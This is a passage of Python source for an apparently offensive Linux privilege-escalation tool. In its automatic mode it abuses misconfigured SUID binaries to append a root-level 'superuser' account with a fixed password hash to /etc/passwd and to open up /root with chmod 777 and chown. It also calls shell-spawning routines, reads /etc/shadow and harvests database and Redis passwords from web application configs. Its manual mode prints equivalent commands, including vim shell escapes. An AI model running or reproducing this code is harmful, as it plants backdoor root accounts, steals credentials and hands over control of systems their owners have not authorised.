    shutil.copyfile('/etc/passwd', '/tmp/passwd')
    f = open('/tmp/passwd','a+')
    f.write('superuser:$1$superuse$D1NjirhAZKLO9jhBU9gyG.:0:0:root:/bin/bash\n')
    f.close()

    os.system("cp /tmp/passwd /etc/passwd")

    #call function named other_msg
    other_msg(flag, bold, green, blue, warning, endc)


#mv_priv_esc function
def mv_priv_esc(bold, green, blue, warning, endc):
    shutil.copyfile('/etc/passwd', '/tmp/passwd')
    f = open('/tmp/passwd','a+')
    f.write('superuser:$1$superuse$D1NjirhAZKLO9jhBU9gyG.:0:0:root:/bin/bash\n')
    f.close()

    os.system("mv /tmp/passwd /etc/passwd")

    #call function named other_msg
    other_msg(flag, bold, green, blue, warning, endc)


#auto_chmod_msg function
def auto_chmod_msg(bold, green, blue, warning, endc):
    print(bold + green + "[!] Permissions of /root changed! You have access on it!\n" + endc)
    print(bold + blue + "-> Directory: /root\n" + endc)


#auto_chown_msg function
def auto_chown_msg(bold, green, blue, warning, endc):
    print(bold + green + "[!] UID and GID of /root changed! You have access on it!" + endc)
    print(bold + blue + "-> Directory: /root" + endc)
 

#chmod_priv_esc function
def chmod_priv_esc(bold, green, blue, warning, endc):
    os.system("chmod 777 /root")
    #call function named auto_chmod_msg
    auto_chmod_msg(bold, green, blue, warning, endc)
    call(["ls", "-la", "/root"])
    print("\n")


#chown_priv_esc function
def chown_priv_esc(bold, green, blue, warning, endc):
    os.system("chown -R $(id -un):$(id -gn) /root")
    #call function named auto_chown_msg
    auto_chown_msg(bold, green, blue, warning, endc)
    call(["ls", "-la", "/root"])
    print("\n")


#important_msg0 function
def important_msg0(bold, blue, warning, endc):
    print(bold + blue + "[+] Advice:\n" + endc)
    print(bold + warning + "-> Follow the below example and take root's privileges!\n" + endc)
    print(bold + blue + "[*] Example:\n" + endc)


#cp_priv_esc2 function
def cp_priv_esc2(bold, blue, warning, endc):
    #call function named important_msg2
    important_msg2(bold, blue, warning, endc)
    command = '''
-> LFILE=file_to_write
-> TF=$(mktemp)
-> echo "DATA" > $TF

-> cp $TF $LFILE\n
    '''
    print(command)


#mv_priv_esc2 function
def mv_priv_esc2(bold, blue, warning, endc):
    #call function named important_msg2
    important_msg2(bold, blue, warning, endc)
    command = '''
-> LFILE=file_to_write
-> TF=$(mktemp)
-> echo "DATA" > $TF

-> mv $TF $LFILE\n
    '''
    print(command)


#chown_priv_esc2 function
def chown_priv_esc2(bold, blue, warning, endc):
    #call function named important_msg2
    important_msg2(bold, blue, warning, endc)
    print('-> LFILE=/root\n')
    print('-> chown $(id -un):$(id -gn) $LFILE\n')


#chmod_priv_esc2 function
def chmod_priv_esc2(bold, blue, warning, endc):
    #call function named important_msg2
    important_msg2(bold, blue, warning, endc)
    print('-> LFILE=/root\n')
    print('-> chmod 0777 $LFILE\n')


#suid_exp function 
def suid_exp(flag, bold, green, blue, fail, warning, endc):
    #set flags values
    flag1 = "false"
    flag2 = "false"

    #find all suid binaries of system
    try:
        command = "find / -perm -4000 2>/dev/null"
        result = os.popen(command).read().strip().split("\n")

        for i in result:
            name = i.split("/")[::-1][0]
            if name in defaults:
                if name == "exim4":
                    command2 = 'exim4 --version 2>/dev/null'
                    result2 = os.popen(command2).read().strip().split("\n")
                    for y in result2:
                        vers1 = y.split(" ")[::1][2]
                        vers1 = float(vers1)
                        break

                    if vers1 >= 4.87 and vers1 <= 4.91:
                        print(bold + green + "\n[!] Found outdated version of exim!\n" +endc)
                        #call function named exim_priv_esc
                        exim_priv_esc(bold, green, blue, fail, warning, endc)
            if name not in defaults:
                binary_path = i
                print(bold + green + "\n[!] Found intersting suid binary: " + binary_path + endc + "\n")
                print(bold + warning + "[!] Detailed permissions of " + binary_path + ":" + endc + "\n")
                os.system('ls -la ' + binary_path)
                print("\n")
                if name in suid_for_read:
                    if name == "ip":
                        #call function named ip_msg
                        ip_msg(bold, blue, warning, endc)

                    #call function named imporant_msg
                    important_msg(bold, blue, warning, endc)
                    print(bold + suid_for_read[name] + '\n\n' + endc)
                elif name in suid_manual:
                    #call function named imporant_msg2
                    important_msg2(bold, blue, warning, endc)
                    print(bold + suid_manual[name] + '\n\n' + endc)
                elif name in suid_manual2:
                    #call function important_msg3
                    important_msg3(bold, blue, warning, endc)
                    print(bold + suid_manual2[name] + '\n' + endc)
                elif name in suid_download:
                    if name == "curl":
                        #call function named curl_priv_esc
                        curl_priv_esc(bold, blue, warning, endc)
                    elif name == "wget":
                        #call function named wget_priv_esc
                        wget_priv_esc(bold, blue, warning, endc)
                    elif name == "lwp-download":
                        #call function named lwp_download_priv_esc
                        lwp_downlaod_priv_esc(bold, blue, warning, endc)
                elif name == "rake":
                    #call function named rake_priv_esc
                    rake_priv_esc(bold, blue, warning, endc)
                elif name == "x86_64-linux-gnu-readelf":
                    #call function named readelf_priv_esc
                    readelf_priv_esc(bold, blue, warning, endc)
                elif name in suid_lim:
                    if name == "nmap":
                        command3 = "nmap --version"
                        result3 = os.popen(command3).read().strip().split("\n")
                        for y in result3:
                            vers = y.split(" ")[::1][2]
                            vers = float(vers)
                            break

                        if vers > 4:
                            print(bold + fail + "[!] Nmap version doesn't support suid binary privilege escalation mode!\n" + endc)
                            print(bold + blue + "[!] " + name + " version: " + endc + str(vers) + '\n')
                        else:
                            #call function named important_msg3
                            important_msg3(bold, blue, warning, endc)
                            print(bold + suid_lim[name] + '\n' + endc)
                    else:
                        #call function named important_msg3
                        important_msg3(bold, blue, warning, endc)
                        print(bold + suid_lim[name] + '\n' + endc)
                if flag == "auto":
                    if name in suid_exec:
                        print(bold + warning + "[!] Try to do auto Escalation...\n" + endc)
                        #call function named root_msg
                        root_msg(bold, green, endc)
                        if name == "bash":
                            #call function named bash_priv_esc
                            bash_priv_esc()
                        elif name == "chroot":
                            #call function named chroot_priv_esc
                            chroot_priv_esc()
                        elif name == "bsd-csh":
                            #call function named csh_priv_esc
                            csh_priv_esc()
                        elif name == "dash":
                            #call function named dash_priv_esc
                            dash_priv_esc()
                        elif name == "docker":
                            #call function named docker_priv_esc
                            docker_priv_esc()
                        elif name == "env":
                            #call function named env_priv_esc
                            env_priv_esc()
                        elif name == "expect":
                            #call function named expect_priv_esc
                            expect_priv_esc()
                        elif name == "find":
                            #call function named find_priv_esc
                            find_priv_esc()
                        elif name == "flock":
                            #call function anmed flock_priv_esc
                            flock_priv_esc()
                        elif name == "gdb":
                            #call function named gdb_priv_esc
                            gdb_priv_esc()
                        elif name == "ionice":
                            #call function named ionice_priv_esc
                            ionice_priv_esc()
                        elif name == "ksh2020":
                            #call function named ksh_priv_esc
                            ksh_priv_esc()
                        elif name == "ld.so":
                            #call function named ld_so_priv_esc
                            ld_so_priv_esc()
                        elif name == "logsave":
                            #call function named logsave_priv_esc
                            logsave_priv_esc()
                        elif name == "nice":
                            #call function named nice_priv_esc
                            nice_priv_esc()
                        elif name == "node":
                            #call function named node_priv_esc
                            node_priv_esc()
                        elif name == "nohup":
                            #call function named nohup_priv_esc
                            nohup_priv_esc()
                        elif name == "php7.4":
                            #call function named php_priv_esc
                            php_priv_esc()
                        elif name == "python2.7":
                            #call function named python_priv_esc
                            python_priv_esc()
                        elif name == "python3.8":
                            #call function named python3_priv_esc
                            python3_priv_esc()
                        elif name == "rlwrap":
                            #call function named rlwrap_priv_esc
                            rlwrap_priv_esc()
                        elif name == "run-parts":
                            #call function named run_parts_priv_esc
                            run_parts_priv_esc()
                        elif name == "setarch":
                            #call function named setarch_priv_esc
                            setarch_priv_esc()
                        elif name == "start-stop-daemon":
                            #call function named start_stop_daemon_priv_esc
                            start_stop_daemon_priv_esc()
                        elif name == "stdbuf":
                            #call function named stdbuf_priv_esc
                            stdbuf_priv_esc()
                        elif name == "strace":
                            #call function named strace_priv_esc
                            strace_priv_esc()
                        elif name == "taskset":
                            #call function named taskset_priv_esc
                            taskset_priv_esc()
                        elif name == "time":
                            #call function named time_priv_esc
                            time_priv_esc()
                        elif name == "timeout":
                            #call function timeout_priv_esc
                            timeout_priv_esc()
                        elif name == "unshare":
                            #call function named unshare_priv_esc
                            unshare_priv_esc()
                        elif name == "xargs":
                            #call function named xargs_priv_esc
                            xargs_priv_esc()
                        elif name == "zsh":
                            #call function named zsh_priv_esc
                            zsh_priv_esc() 
                    elif name in suid_mody:
                        #call function named config_msg
                        config_msg(bold, blue, warning, endc)                   
                        if name == "cp":
                            #set new flag value
                            flag1 = "true"
                            #call function named cp_priv_esc
                            cp_priv_esc(flag, bold, green, blue, warning, endc)
                        elif name == "mv":
                            #set new flag value
                            flag1 = "true"
                            #call function named mv_priv_esc
                            mv_priv_esc(bold, green, blue, warning, endc)
                    elif name in suid_mody2:
                        if name == "chmod":
                            #set new flag value
                            flag2 = "true"
                            #call function named chmod_priv_esc
                            chmod_priv_esc(bold, green, blue, warning, endc)
                        elif name== "chown":
                            #set new flag value
                            flag2 = "true"
                            #call function named chown_priv_esc
                            chown_priv_esc(bold, green, blue, warning, endc)
                elif flag == "manual":
                    if name in suid_manual3:
                        #call function named important_msg0
                        important_msg0(bold, blue, warning, endc)
                        print(bold + suid_manual3[name] + endc + '\n') 
                    elif name in suid_mody:
                        if name == "cp":
                            #call function named cp_priv_esc2
                            flag, cp_priv_esc2(bold, blue, warning, endc)
                        elif name == "mv":
                            #call function named mv_priv_esc2
                            mv_priv_esc2(bold, blue, warning, endc)
                    elif name in suid_mody2:
                        if name == "chown":
                            #call function named chown_priv_esc2
                            chown_priv_esc2(bold, blue, warning, endc)
                        elif name == "chmod":
                            #call function named chmod_priv_esc2
                            chmod_priv_esc2(bold, blue, warning, endc)
    except:
        print(bold + fail + "[!] System Error! Can't search for suid binaries files\n" + endc)
                    
    
    return flag1, flag2


#controller function
def controller(filename, flag, bold, blue, green, warning, endc):
    if flag != "manual":
        if filename == '/etc/passwd':
            #call function config_msg
            config_msg(bold, blue, warning, endc)

            #call function named cp_priv_esc
            cp_priv_esc(flag, bold, green, blue, warning, endc)
    else:
        if filename == '/etc/passwd':
            #call function config_msg2
            config_msg2(filename, bold, blue, warning, endc)

            print(bold + '-> echo "superuser:$1$superuse$D1NjirhAZKLO9jhBU9gyG.:0:0:root:/bin/bash" >> /etc/passwd\n\n' + endc)
            
            #call function other_msg
            other_msg(flag, bold, green, blue, warning, endc) 


#checker_general function
def checker_general(filename):
    #set status of file
    status = os.stat(filename)
    
    #find owner and group of the file
    uid = status.st_uid
    gid = status.st_gid
    #print(uid)
    #print(gid)

    ownername = pwd.getpwuid(uid)[0]
    groupname = grp.getgrgid(gid)[0]
    #print(ownername)
    #print(groupname)

    #convert status to octal
    octa_status = oct(status.st_mode)[-3:]
    octa_status2 = oct(status.st_mode)[-2:]
    octa_status3 = oct(status.st_mode)[-1:]
    #print(octa_status)
    #print(octa_status2)
    #print(octa_status3)

    return ownername, groupname, octa_status, octa_status2, octa_status3


#passwd_check function
def passwd_check(flag, bold, blue, green, warning, endc):
    #set flag
    chamber = "false"

    #set filename
    filename = '/etc/passwd'
    
    #call function named checker_general
    resulter = checker_general(filename)

    if resulter[2] != '644':
        if resulter[4] != '0' and resulter[4] != '1' and resulter[4] != '4' and resulter[4] != '5':
            #call function named banner_msg
            banner_msg(filename, bold, green, endc)

            #call function named controller
            controller(filename, flag, bold, blue, green, warning, endc)

            chamber = "true"

    return chamber


#ownership_passwd_check function
def ownership_passwd_check(flag, bold, blue, green, warning, endc, user):
    #set filename
    filename = '/etc/passwd'
 
    #call function named checker_general
    resulter = checker_general(filename)

    if resulter[0] == user:
        if resulter[2] >= '600':
            #call function named banner_msg2
            banner_msg2(filename, bold, green, endc)
            
            #call function named controller
            controller(filename, flag, bold, blue, green, warning, endc)
    elif resulter[1] == user:
        if resulter[3] >= '60':
            #call function named banner_msg3
            banner_msg3(filename, bold, green, endc)
            
            #call function named controller
            controller(filename, flag, bold, blue, green, warning, endc)


#shadow_check function
def shadow_check(flag, bold, blue, green, warning, endc, orange):
    #set flag
    chamber2 = "false"

    #set filename
    filename = '/etc/shadow'
    
    #call function named checker_general
    resulter = checker_general(filename)

    if resulter[2] != '640':
        if resulter[4] >= '4':
            #call function named banner_msg
            banner_msg(filename, bold, green, endc)

            #call function named banner_msg4
            banner_msg4(filename, bold, warning , endc)
            
            #call function banner_msg7
            banner_msg7(filename, flag, bold, blue, warning, endc, orange)

            chamber2 = "true"

            if flag == "manual":
                print(bold + '-> cat /etc/shadow\n' + endc)

    return chamber2


#ownership_shadow_check function
def ownership_shadow_check(flag, bold, blue, green, warning, endc, user, orange):
    #set filename
    filename = '/etc/shadow'

    #call function named checker_general
    resulter = checker_general(filename)

    if resulter[0] == user:
        if resulter[2] >= '400':
            #call function named banner_msg2
            banner_msg2(filename, bold, green, endc)

            #call function named banner_msg4
            banner_msg4(filename, bold, warning , endc)
            
            #call function banner_msg7
            banner_msg7(filename, flag, bold, blue, warning, endc, orange)

            if flag == "manual":
                print(bold + '-> cat /etc/shadow\n' + endc)
    elif resulter[1] == user:
        if resulter[3] >= '40':
            #call function named banner_msg2
            banner_msg3(filename, bold, green, endc)

            #call function named banner_msg4
            banner_msg4(filename, bold, warning , endc)
            
            #call function banner_msg7
            banner_msg7(filename, flag, bold, blue, warning, endc, orange)

            if flag == "manual":
                print(bold + '-> cat /etc/shadow\n' + endc)


#root_dir_check function
def root_dir_check(flag, bold, blue, green, warning, endc):
    #set chamber3
    chamber3 = "false"
    
    #set dir_name
    dir_name = '/root'
 
    #call function named checker_general
    resulter = checker_general(dir_name)

    if resulter[2] != '700':
        if resulter[4] == "5" or resulter[4] == "7":
             #call function named banner_msg6
             banner_msg6(dir_name, bold, green, endc)

             #call function named banner_msg4
             banner_msg4(dir_name, bold, warning, endc)

             chamber3 = "true"

             if flag != "manual":
                 print(bold + blue + "-> Directory: /root\n" + endc)
                 call(['ls', '-la', '/root'])
                 print('\n')
    
    return chamber3


#ownership_root_dir_check function
def ownership_root_dir_check(flag, bold, blue, green, warning, endc, user, orange):
    #set dir_name
    dir_name = "/root"

    #call function named checker_general
    resulter = checker_general(dir_name)

    if resulter[0] == user:
        if (resulter[2] >= '500' and resulter[2] < '600') or resulter[2] >= '700':
            #call function named banner_msg8
            banner_msg8(dir_name, bold, green, endc)

            #call function named banner_msg4
            banner_msg4(dir_name, bold, warning , endc)

            if flag != "manual":
                print(bold + blue + "-> Directory: /root\n" + endc)
                call(['ls', '-la', '/root'])
                print('\n')
    elif resulter[1] == user:
        if (resulter[3] >= '50' and resulter[3] < '60') or resulter[3] >= '70':
            #call function named banner_msg9
            banner_msg9(dir_name, bold, green, endc)

            #call function named banner_msg4
            banner_msg4(dir_name, bold, warning , endc)

            if flag != "manual":
                print(bold + blue + "-> Directory: /root\n" + endc)
                call(['ls', '-la', '/root'])
                print('\n')


#apache2_check function
def apache2_check(filename1, flag, bold, blue, green, warning, endc):
    #set flag
    flagon = "false"
    
    #call function named checker_general
    resulter = checker_general(filename1)

    if resulter[2] != '644':
        if resulter[4] != '0' and resulter[4] != '1' and resulter[4] != '4' and resulter[4] != '5':
            #call function named banner_msg
            banner_msg(filename1, bold, green, endc)
            flagon = "true"

            if flag == "auto" or flag == "manual":
                #call function named banner_msg10
                banner_msg10(filename1, bold, blue, warning, endc)
                print(bold + '-> https://www.hackingarticles.in/digitalworld-localtorment-vulnhub-walkthrough/\n' + endc)

    return flagon


#ownership_apache2_check function
def ownership_apache2_check(filename1, flag, bold, blue, green, warning, endc, user):
    #call function named checker_general
    resulter = checker_general(filename1)
    
    #set flag
    chester = "false"

    if resulter[0] == user:
        if resulter[2] >= '600':
            #call function named banner_msg2
            banner_msg2(filename1, bold, green, endc)
            chester = "true"
    elif resulter[1] == user:
        if resulter[3] >= '60':
            #call function named banner_msg3
            banner_msg3(filename1, bold, green, endc)
            chester = "true"

    if flag == "auto" or flag == "manual":
        if chester == "true":
            #call function named banner_msg10
            banner_msg10(filename1, bold, blue, warning, endc)
            print(bold + '-> https://www.hackingarticles.in/digitalworld-localtorment-vulnhub-walkthrough/\n' + endc)


#apache2_found function
def apache2_found(flag, bold, blue, green, warning, endc, user):
    start = "/etc/"

    for dirpath, dirnames, filenames in os.walk(start):
        for filename in filenames:
            if filename == "apache2.conf" or filename == "httpd.conf": #Ubuntu/Debian or Redhat
                filename1 = os.path.join(dirpath, filename)
                
                #call function named apache2_check
                flagon = apache2_check(filename1, flag, bold, blue, green, warning, endc)

                if flagon != "true":
                    #call function named ownership_apache2_check
                    ownership_apache2_check(filename1, flag, bold, blue, green, warning, endc, user)


#redis_check function
def redis_check(filename1, flag, bold, blue, green, warning, endc):
    #call function named checker_general
    resulter = checker_general(filename1)

    #set flag
    chester2 = "false"

    if resulter[2] != '640':
        if resulter[4] >= '4':
            #call function named banner_msg
            banner_msg(filename1, bold, green, endc)

            chester2 = "true"

            if flag != "manual":
                #call function read_redis
                read_redis(filename1, bold, warning, endc)
            else:
                #call function named banner_msg4
                banner_msg4(filename1, bold, warning, endc)
    
    return chester2


#show_redis_creds function
def show_redis_creds(filename, redis_array, bold, warning, endc):
    print(bold + warning + "\n[!] Interesting lines of " + filename + ":\n" + endc)
    for i in redis_array:
        print(i)

    print('\n')


#read_redis function
def read_redis(filename1, bold, warning, endc):
    keywords = [ 'requirepass' ]

    fopen = open(filename1, mode='r+') 
    fread = fopen.readlines()
    
    for liner in fread: 
        for y in keywords: 
            if y in liner: 
                redis_lines.append(liner)

    redis_array = redis_lines

    #call function named show_redis_creds
    show_redis_creds(filename1, redis_array, bold, warning, endc)

    #clear array
    redis_array *= 0


#ownership_redis_check function
def ownership_redis_check(filename1, flag, bold, blue, green, warning, endc, user):
    #call function named checker_general
    resulter = checker_general(filename1)

    if resulter[0] == user:
        if resulter[2] >= '400':
            #call function named banner_msg2
            banner_msg2(filename1, bold, green, endc)

            if flag != "manual":
                #call function read_redis
                read_redis(filename1, bold, warning, endc)
            else:
                #call function named banner_msg4
                banner_msg4(filename1, bold, warning, endc)
    elif resulter[1] == user:
        if resulter[3] >= '40':
            #call function named banner_msg3
            banner_msg3(filename1, bold, green, endc)

            if flag != "manual":
                #call function read_redis
                read_redis(filename1, bold, warning, endc)
            else:
                #call function named banner_msg4
                banner_msg4(filename1, bold, warning, endc)


#redis_found function
def redis_found(flag, bold, blue, green, warning, endc, user):
    start = "/etc/"

    for dirpath, dirnames, filenames in os.walk(start):
        for filename in filenames:
            if filename == "redis.conf" or filename == "6379.conf":
                filename1 = os.path.join(dirpath, filename)

                #call function named redis_check
                chester2 = redis_check(filename1, flag, bold, blue, green, warning, endc)

                if chester2 != "true":
                    #call function named ownership_redis_check
                    ownership_redis_check(filename1, flag, bold, blue, green, warning, endc, user)


#weak_perms function 
def weak_perms(flag, flager, user, bold, blue, green, fail, warning, endc, orange):
    if flager[0] != "true":
        #call function named passwd_check
        chamber = passwd_check(flag, bold, blue, green, warning, endc)

        if chamber != "true":
            #call function named ownership_passwd_check
            ownership_passwd_check(flag, bold, blue, green, warning, endc, user)

    #call function named shadow_check
    chamber2 = shadow_check(flag, bold, blue, green, warning, endc, orange)

    if chamber2 != "true":
        #call function named ownership_shadow_check
        ownership_shadow_check(flag, bold, blue, green, warning, endc, user, orange)

    if flager[1] != "true":
        #call function named root_dir_check
        chamber3 = root_dir_check(flag, bold, blue, green, warning, endc)

        if chamber3 != "true":
            #call function named ownership_root_dir_check
            ownership_root_dir_check(flag, bold, blue, green, warning, endc, user, orange)

    #call function named apache2_found
    apache2_found(flag, bold, blue, green, warning, endc, user)

    #call function named redis_found
    redis_found(flag, bold, blue, green, warning, endc, user)


#show_db_creds function 
def show_db_creds(filename, php_array, bold, green, warning, endc):
    print(bold + warning + "\n[!] Interesting lines of " + filename + ":\n" + endc)
    for i in php_array:
        print(i)

    print('\n')


#read_db_creds function 
def read_db_creds(keyword1, keyword2, keyword3, keyword4, filename, bold, green, warning, endc): 
    #set an array
    keyword = [ keyword1, keyword2, keyword3, keyword4 ]

    fopen = open(filename, mode='r+') 
    fread = fopen.readlines()

    for line in fread: 
        for x in keyword: 
            if x in line: 
                php_files2.append(line)

    php_array = php_files2
    #call function named show_db_creds 
    show_db_creds(filename, php_array, bold, green, warning, endc)
    
    #clearing array
    php_array *= 0


#read_php_config function 
def read_php_config(filename, filename1, bold, green, warning, endc): 
    if filename == "wp-config.php" or filename == "wp-config-sample.php": #wordpress 
        keyword1 = "DB_NAME" 
        keyword2 = "DB_USER" 
        keyword3 = "DB_PASSWORD" 
        keyword4 = "DB_HOST" 
    elif filename == "configuration.php": #joomla 
        keyword1 = "$host" 
        keyword2 = "$user" 
        keyword3 = "$password"
        keyword4 = "$db"
    else: #drupal and customs
        keyword1 = "database"
        keyword2 = "username"
        keyword3 = "password"
        keyword4 = "host"

    #call function read_db_creds 
    read_db_creds(keyword1, keyword2, keyword3, keyword4, filename1, bold, green, warning, endc)
    

#php_config function 
def php_config(flag, bold, green, warning, fail, endc): 
    #set list of start directories 
    start = [ "/var", "/usr", "/home" ] #supports Ubuntu/Debian/RedHat/BSD

    for i in start: 
        for dirpath, dirnames, filenames in os.walk(i): 
            for filename in filenames: 
                if filename in php_files: 
                    filename1 = os.path.join(dirpath, filename) 
                    #call function named banner_msg5
                    banner_msg5(filename1, bold, green, endc)

                    if flag == "auto":
                        #call function named checker_general
                        php_perms = checker_general(filename1)

                        if php_perms[4] >= '4':
                            #call function named read_php_config
                            read_php_config(filename, filename1, bold, green, warning, endc)
                        else:
                            print(bold + fail + "[!] Can't read {} \n".format(filename1) + endc)


#rvim_capa function
def rvim_capa():
    command = '''
-> rvim -c ':lua os.execute("reset; exec sh")'
    '''
    print(command + '\n')


#vim_capa function
def vim_capa():
    command = '''
-> vim -c ':lua os.execute("reset; exec sh")'
    '''
    print(command + '\n')


#capa_exp function 
def capa_exp(bold, blue, green, warning, fail, endc): 
    try:
        command = '''
    getcap -r / 2>/dev/null
        '''
        result = os.popen(command).read().strip().split("\n")

        for n in result:
            name = n.split("/")[::-1][0]
            name2 = name.split("=")[::1][0]
            name3 = name2.split(" ")[::1][0]
            #print(name3)
            if name3 not in capa_default:
                print(bold + green + "\n[!] Found interesting capability: " + name3 + endc + '\n')
                print(bold + warning + "Details of " + name3 + ":\n" + endc)
                print(n + "\n\n")
                if name3 in capa_exec:
                    #call function named important_msg5
                    important_msg5(bold, blue, warning, endc)
                    print(bold + capa_exec[name3] + "\n" + endc)
                elif name3 == "rvim":
                    #call function named improtant_msg6
                    important_msg7(bold, blue, warning, endc)
                    #call function named rvim_capa
                    rvim_capa()
                elif name3 == "vim":
                    #call function named important_msg7
                    important_msg7(bold, blue, warning, endc)
                    #call function named vim_capa
                    vim_capa()
    except:
        print(bold + fail + "[!] System Error! Can't search for capabilities" + endc)


#full_write function 
def full_write(bold, blue, green, warning, fail, endc):
    try:
        command = 'find / -user root -writable -type f 2>/dev/null| grep -vE "proc|sys"'
        result = os.popen(command).read().strip().split("\n")

        for z in result:
            write_array.append(z)

        write2_array = write_array
        
        if write2_array[0] != "":
            if len(write2_array) == 1:
                print(bold + green + "\n[!] Found World Writable File:\n" + endc)
            else:
                print(bold + green + "\n[!] Found World Writable Files:\n" + endc)
            
            for g in write2_array:
                print(g)
            
            print('\n')

        #clearing array
        write2_array *= 0
    except:
        print(bold + fail + "[!] System Error! Can't search for world writable files!\n" + endc) 


#main function 
def main(): 
    #call function named arguments 
    args = arguments(argv)
    
    #call objects from classes 
    me = User() 
    it = Victim()

    #check for colors 
    if  args.color: 
        #call objects from Nocolors class 
        bcolor = Nocolors() 
    else: 
        #call objects from Bcolors class 
        bcolor = Bcolors()
    
    #call function named check_4_args 
    arg_flag = check_4_args(args)
    
    #call function named check_4_args2 
    arg_flag2 = check_4_args2(args, argv)
    
    #check non default double arguments 
    if arg_flag == "nothing":
        print(bcolor.BOLD + bcolor.WARNING + message + bcolor.ENDC)
        print(bcolor.BOLD + bcolor.FAIL + '[!] Use -h, --help to see valid options!\n' + bcolor.ENDC) 
        exit()
    
    #check banner 
    if arg_flag == "banner": 
        if args.banner: 
            print(bcolor.BOLD + bcolor.FAIL + message + bcolor.ENDC) 
            exit()
    
    #check version 
    if arg_flag == "version": 
        if args.version: 
            print(bcolor.BOLD + bcolor.OKBLUE + message + bcolor.ENDC) 
            print(bcolor.BOLD + bcolor.OKGREEN + '[+] Current Version: ' + bcolor.ENDC + __version__ + '\n' )
            exit()
    
    #check auto or manual 
    if arg_flag == "auto": 
        flag = "auto"
        print(bcolor.BOLD + bcolor.ORANGE + message + bcolor.ENDC) 
    elif arg_flag == "manual": 
        flag = "manual" 
        print(bcolor.BOLD + bcolor.OKBLUE + message + bcolor.ENDC)
   
    #call function named test_date 
    dt = test_date() 
    print(bcolor.BOLD + bcolor.OKBLUE + '[+] Process started at:\n' + bcolor.ENDC) 
    print(dt + '\n\n')

    #call function named find_whoami 
    find_whoami(me.name, me.user, me.group, me.real, me.list, me.home, me.shell, bcolor.BOLD, bcolor.OKBLUE, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)

    #call function named find_victim 
    find_victim(bcolor.BOLD, bcolor.OKBLUE, bcolor.WARNING, bcolor.ENDC, it.host, it.distro, it.kernel, it.pross, it.arch)
   
    if arg_flag2 == "nothing": 
        #set temp list
        flager = [ 'false', 'false' ]

        if args.suid: 
            #call function named suid_exp
            flager = suid_exp(flag, bcolor.BOLD, bcolor.OKGREEN, bcolor.OKBLUE, bcolor.FAIL, bcolor.WARNING, bcolor.ENDC)

        if args.weak: 
            #call function named weak_perms
            weak_perms(flag, flager, me.name, bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.FAIL, bcolor.WARNING, bcolor.ENDC, bcolor.ORANGE)

        if args.php: 
            #call function named php_config 
            php_config(flag, bcolor.BOLD, bcolor.OKGREEN, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)

        if args.capa: 
            #call function named capa_exp 
            capa_exp(bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)

        if args.full: 
            #call function named full_write 
            full_write(bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)
        
    elif arg_flag2 == "all": 
        #call function named suid_exp 
        flager = suid_exp(flag, bcolor.BOLD, bcolor.OKGREEN, bcolor.OKBLUE, bcolor.FAIL, bcolor.WARNING, bcolor.ENDC)
        
        #call function named weak_perms 
        weak_perms(flag, flager, me.name, bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.FAIL, bcolor.WARNING, bcolor.ENDC, bcolor.ORANGE)

        #call function named php_config 
        php_config(flag, bcolor.BOLD, bcolor.OKGREEN, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)

        #call function named capa_exp 
        capa_exp(bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)

        #call function named full_write 
        full_write(bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.WARNING, bcolor.FAIL, bcolor.ENDC)
            
    #call function named job_finish 
    job_finish(flag, bcolor.BOLD, bcolor.OKBLUE, bcolor.OKGREEN, bcolor.ENDC)


if __name__ == "__main__": 
    #call function named main 
    main()
